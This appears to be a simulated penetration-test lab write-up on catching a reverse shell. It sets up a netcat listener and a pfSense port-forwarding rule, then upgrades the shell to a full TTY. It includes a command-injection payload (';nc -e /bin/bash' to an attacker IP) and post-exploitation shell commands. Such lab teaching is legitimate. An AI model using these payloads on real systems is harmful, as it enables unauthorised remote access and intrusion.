# Stage 3: Exploiting Vulnerability

### What Is A Reverse Shell

A reverse shell is a method attackers use to access a victim's system. The reverse shell is so effective because of the way most firewalls are already configured. Most firewalls default to deny all inbound traffic but allow all outbound traffic. A reverse shell is so effective because the attacker uses an exploit to send out a shell from the victim's system to the attacker's WAN to gain access. This bypasses the firewall because it allows all traffic outbound rules to send a shell to the attacker's WAN. 

### How To Catch A Reverse Shell
To catch a reverse shell you need 3 things: 

- Listener (think: _'thing that catches reverse shell'_)
- Payload (think: _'thing that sends you a reverse shell'_)
- Port Forwarding rule (think: _'thing that forwards reverse shell from router to kali'_)


### Listener

Attacker:

```bash
nc -lvp 44554
```

nc: stands for "netcat" which is a versatile networking tool used for various communication purposes.

-l: instructs netcat to listen for incoming connections on a specified port.

v: enables verbose mode, providing more detailed output about the connection.

p 44554: specifies the port number (44554 in this case) on which netcat should listen.

### Payload

```bash
;nc -e /bin/bash 192.168.122.209 44554
```

nc: stands for "netcat" which is a versatile networking tool used for various communication purposes.

-e /bin/bash: specifies that netcat should execute a shell (/bin/bash) on the established connection.

192.168.122.209 44554: This specifies the target IP address (192.168.122.209) and port number (44554) to connect to.

It is important to note when executing a payload you must send the shell to the attackers WAN because the firewall rules denys all inbound traffic. This is why we create a port forwarding rule.

### Port Forwarding Rule

Because this a simulated enviroment we have to find the router/firewall. To access the router/firewall we have to understand how networking works. On the Kali box I am attacking from I run "ifconfig" to get my IP address. 

- Attacker IP address is 192.168.2.72
- The subnet is set to 255.255.255.0

In order to be on the same network the first 3 octects have to match,because of the subnet mask. In this case all devices on this network start with 192.168.2.X. Most routers are usually set to be the first or last device on the network.

I put "192.168.2.1" in the firefox browser and it brings up a pfsense GUI. 

I then go to the firewall settings to enable a port forwarding rule on port 44554 to 192.168.2.72 (attacker box).

![image](https://github.com/fabianreyyes/Simulated-Pen-Test/blob/main/media/setup.gif)

### Catching A Reverse Shell

With everything set up on the attacking machine, including a listener and the appropriate port forwarding rule, we can initiate the attack. When we trigger the exploit (e.g., clicking a button), the target application will likely enter a processing or loading state. This indicates the payload has been delivered and the application is waiting for a response. Switching to our attacker terminal, we should see a new connection established from the victim's network. By running a system identification command (like "id"), we can gain some insight into the user privileges we might have obtained on the compromised system.

![image](https://github.com/fabianreyyes/Simulated-Pen-Test/blob/main/media/payload.gif)

### Upgrading Reverse Shell 
##### (allows tab complete, arrows keys, etc)(ONLY WORKS ON LINUX, use rlwrap in front of listener for windows)

#### Validate python or python3 on the machine
```bash
python -V
python3 -V
```
#### Make sure to use the correct version of python for next command!
```bash
python -c 'import pty; pty.spawn("/bin/bash")' 
SHELL=/bin/bash script -q /dev/null (if your machine doesn't have python)
```
#### Next, background the shell to start sending raw input, this bypasses your local interpreter (shell) and sends your keystrokes to the reverse shell (victim)
```
Ctrl + Z (background the shell)
stty raw -echo; fg
reset
```
If it asks what TERM to use, set it to **xterm-256color**, or whatever your attacker machine's $TERM is set to. 

### Validate Terminal Type
```
echo $TERM
export TERM=xterm-256color
echo $TERM
```
You should now be able to clear your terminal and use text editors like nano and vim.

### Validate Shell for User
```
echo $SHELL
export SHELL=/bin/bash
echo $SHELL
```
### Validate size of screen
```
echo $TERM && tput lines && tput cols (run on attacker)
stty rows 38 columns 116 (run on victim)
```
Note: you'll want to run the second command with numbers from the first command, so you're setting the victim's shell size to your local kali machine's shell size. 
This helps prevent wordwrap from distorting the shell and will help other tools like nano and vim work as expected.

Note2: It's possible to have a scenario where your shell and your nano/vim sizes don't align on a target. You can use the 'w' command to validate the size of the terminal through a guessing process.

You should now have a fully functional shell, where even sending a ^C (Ctrl + C, normally intended to stop processes) won't cause the shell to die. 

![image](https://github.com/fabianreyyes/Simulated-Pen-Test/blob/main/media/upgrade_reverse_shell.gif)
